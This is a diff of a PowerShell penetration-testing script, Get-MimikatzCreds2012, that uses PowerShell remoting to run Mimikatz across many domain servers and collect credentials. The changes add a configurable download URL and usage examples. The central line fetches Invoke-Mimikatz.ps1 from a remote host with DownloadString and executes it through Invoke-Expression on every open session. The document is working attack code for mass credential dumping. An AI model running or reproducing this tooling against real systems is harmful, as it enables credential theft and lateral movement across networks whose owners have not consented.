@@ -1,7 +1,9 @@
-# modder of other's stuff: Scott Sutherland (@_nullbind), 2015 NetSPI
-# Description:  This uses psremoting to mass mimikatz 2012 servers from a non domain system.
+# Author: Scott Sutherland (@_nullbind), 2015 NetSPI
+# Description:  This can be used to massmimikatz 2012 server from a non domain system.
 # Example: PS C:\> Get-MimikatzCreds2012 -DomainController dc1.acme.com -Credential acme\user -MaxHost 10
-# Note: this is based on work done by rob fuller, JosephBialek, carlos perez, benjamin delpy, and will schroeder.
+# Example: PS C:\> Get-MimikatzCreds2012 -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -PsUrl "https://10.1.1.1/Invoke-Mimikatz.ps1"
+# Example: PS C:\> Get-MimikatzCreds2012 -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 | out-file .\mimikatz-output.txt
+# Note: this is based on work done by rob fuller and will schroeder.
 # Just for fun.
 
 function Get-MimikatzCreds2012
@@ -20,6 +22,10 @@ function Get-MimikatzCreds2012
         [Parameter(Mandatory=$false,
         HelpMessage="This limits how many servers to run mimikatz on.")]
         [int]$MaxHosts = 5,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Set the url to download invoke-mimikatz.ps1 from.  The default is the github repo.")]
+        [string]$PsUrl = "https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1",
 
         [Parameter(Mandatory=$false,
         HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
@@ -116,7 +122,7 @@ function Get-MimikatzCreds2012
             # run the mimikatz command
             Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
             $x = Get-PSSession
-            Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1');invoke-mimikatz}
+            Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString("$PsUrl");invoke-mimikatz}
 
             # remove sessions
             Write-verbose "Removing ps sessions..."
